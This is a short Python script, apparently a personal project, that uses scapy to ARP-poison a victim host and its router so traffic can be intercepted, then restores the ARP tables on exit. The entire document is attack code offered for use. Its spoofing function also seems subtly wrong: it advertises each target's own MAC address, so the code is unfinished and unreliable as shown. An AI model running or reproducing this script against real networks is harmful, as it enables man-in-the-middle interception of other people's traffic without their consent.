'''
arp-spoofer.py
--------------
arp poison attack script.
'''
from scapy.all import *
import sys

def arpSpoof(dest_ip,dest_mac,src_ip):
	# TODO spoof it up...
	packet = ARP(op='is-at',hwsrc = dest_mac,
				psrc = dest_ip,pdst = src_ip)
	send(packet,verbose=True) # Originally set to 'False', but I like True, I think?

def arpRestore(dest_ip,dest_mac,src_ip,src_mac):
	packet = ARP(op='is-at',hwsrc = src_mac,
				psrc = src_ip,hwdst = dest_mac,pdst = dest_ip)
	send(packet,verbose=True)

def main():
	victim_ip = sys.argv[1]
	router_ip = sys.argv[2]
	victim_mac = getmacbyip(victim_ip)
	router_mac = getmacbyip(router_ip)

	try:
		print('Sending spoofed ARPs...')
		while 1:
			arpSpoof(victim_ip,victim_mac,router_ip)
			arpSpoof(router_ip,router_mac,victim_ip)
	except KeyboardInterrupt:
		print('Restoring ARP tables...')
		arpRestore(router_ip,router_mac,victim_ip,victim_mac)
		arpRestore(victim_ip,victim_mac,router_ip,router_mac)
		quit()

main()